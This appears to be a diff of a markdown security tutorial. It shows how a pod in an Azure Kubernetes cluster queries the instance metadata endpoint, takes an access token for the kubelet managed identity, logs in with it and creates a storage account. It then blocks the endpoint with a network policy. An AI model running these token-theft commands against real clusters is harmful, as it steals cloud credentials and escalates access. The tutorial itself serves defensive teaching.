@@ -24,7 +24,7 @@ https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-servi
 
 # 1. Setup environment
 
-```shell
+```sh
 $AKS_RG="rg-aks-cluster"
 $AKS_NAME="aks-cluster"
 
@@ -40,7 +40,7 @@ az aks get-credentials -n $AKS_NAME -g $AKS_RG --overwrite-existing
 
 # 2. Get AKS Managed Identities attached to the cluster (VMSS)
 
-```shell
+```sh
 az vmss identity show -g rg-spoke-aks-nodes -n aks-poolsystem-97210295-vmss # replace with your vmss name & rg
 # {
 #   "principalId": null,
@@ -71,13 +71,13 @@ az vmss identity show -g rg-spoke-aks-nodes -n aks-poolsystem-97210295-vmss # re
 
 Create azure-cli pod
 
-```shell
+```sh
 kubectl run azure-cli -it --rm --image=mcr.microsoft.com/azure-cli:latest -- bash
 ```
 
 Inside azure-cli pod, access IMDS metadata endpoint and view information
 
-```shell
+```sh
 curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" | jq
 ```
 
@@ -278,7 +278,7 @@ curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance
 
 ## 4. Get the MSI Kubelet Client ID from the tagsList
 
-```shell
+```sh
 curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" | jq .compute.tagsList[4].value
 # "e5dbcd30-9b3d-4041-b791-ac23f9038175"
 
@@ -289,7 +289,7 @@ echo $MSI_KUBELET_CLIENT_ID
 
 # 5. Get the access token for the MSI Kubelet Client ID
 
-```shell
+```sh
 curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://management.azure.com/&client_id=$MSI_KUBELET_CLIENT_ID" | jq
 # {
 #     "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyIsImtpZCI6Ii1LSTNROW5OUjdiUm9meG1lWm9YcWJIWkdldyJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzE2YjNjMDEzLWQzMDAtNDY4ZC1hYzY0LTdlZGEwODIwYjZkMy8iLCJpYXQiOjE2Nzc4NTQ3ODEsIm5iZiI6MTY3Nzg1NDc4MSwiZXhwIjoxNjc3OTQxNDgxLCJhaW8iOiJFMlpnWUxCYXVXbmpwbXZzY2FiWEk5OWJKa3dzQVFBPSIsImFwcGlkIjoiMjE0OTNlMjUtZmM2NS00ZjQ1LWJiNDctNDVkYmYyNDQ5Y2FiIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMTZiM2MwMTMtZDMwMC00NjhkLWFjNjQtN2VkYTA4MjBiNmQzLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiMmJjOWUwYzQtNGVkZC00YzFiLTk5NzItM2EwOTVkMmJkY2U2IiwicmgiOiIwLkFBQUFFOEN6RmdEVGpVYXNaSDdhQ0NDMjAwWklmM2tBdXRkUHVrUGF3ZmoyTUJPOEFBQS4iLCJzdWIiOiIyYmM5ZTBjNC00ZWRkLTRjMWItOTk3Mi0zYTA5NWQyYmRjZTYiLCJ0aWQiOiIxNmIzYzAxMy1kMzAwLTQ2OGQtYWM2NC03ZWRhMDgyMGI2ZDMiLCJ1dGkiOiJuNkU4a2MzVUhrNnJycHhrNVp0Q0FnIiwidmVyIjoiMS4wIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvODJmNmQ3NWUtODVmNC00MzRhLWFiNzQtNWRkZGQ5ZmE4OTEwL3Jlc291cmNlZ3JvdXBzL3JnLXNwb2tlLWFrcy1ub2Rlcy9wcm92aWRlcnMvTWljcm9zb2Z0Lk1hbmFnZWRJZGVudGl0eS91c2VyQXNzaWduZWRJZGVudGl0aWVzL2luZ3Jlc3NhcHBsaWNhdGlvbmdhdGV3YXktYWtzLWNsdXN0ZXIiLCJ4bXNfdGNkdCI6MTY0NTEzNzIyOH0.hS5qKPqnc3OrEPTqXbuyz8uYULRo8Ii9a2t0XCq9SkNztb_31SyJ6XC4KSAVrE-IStVPyd5IGTDT14uo2VcbwbqnmBCQ-hyq35NIYI_h5bgX2IGSNRPDGsM_RKZdgijKLJ6w3whfdOx--8YDVvnh7MHqC0jNbAfW5i9RFjD5UkxVaLRJR-1NYHUkAdbevk-UvS1BMcoWgEN9fgs2gApwT0Ik6hbz8_P2dPZeBK1-uvBoLSNZ3YR2zYgWEhWSE41G6rsBqX1fTp3QS2rVKLEn99utVqnpwFltkQPeX5xXjP9IJf-V-zALo5-3B8TA6pnwN6zOzdSap5WYd4v6jObCTg",
@@ -309,7 +309,7 @@ Decode accessToken on http://jwt.io
 
 Get the resource ID (or client ID or Object ID) for any attached MSI
 
-```shell
+```sh
 MSI_RESOURCE_ID="/subscriptions/82f6d75e-85f4-434a-ab74-5dddd9fa8910/resourcegroups/rg-spoke-aks-nodes/providers/Microsoft.ManagedIdentity/userAssignedIdentities/ingressapplicationgateway-aks-cluster" # REPLACE WITH YOUR MSI ATTACHED TO AKS VMSS
 
 # login to Azure using MSI
@@ -337,7 +337,7 @@ az resource list -o table
 
 Create a storage account
 
-```shell
+```sh
 az storage account create -n stortobedeletedbyhacker -g rg-spoke-aks-nodes
 # successfuly created
 
@@ -368,13 +368,13 @@ Exit from azure-cli pod
 
 # 7. Network Policy to the rescue; deny access to IMDS endpoint
 
-```shell
+```sh
 kubectl apply -f network-policy-deny-imds.yaml
 ```
 
 # 8. Validate that access to IMDS is now denied
 
-```shell
+```sh
 kubectl run azure-cli -it --rm --image=mcr.microsoft.com/azure-cli:latest -- bash
 ```
 
@@ -382,7 +382,7 @@ Run these commands inside azure-cli pod
 
 Try access to IMDS endpoint; it should fail
 
-```shell
+```sh
 curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" | jq
 
 # login to Azure using MSI; it should fail
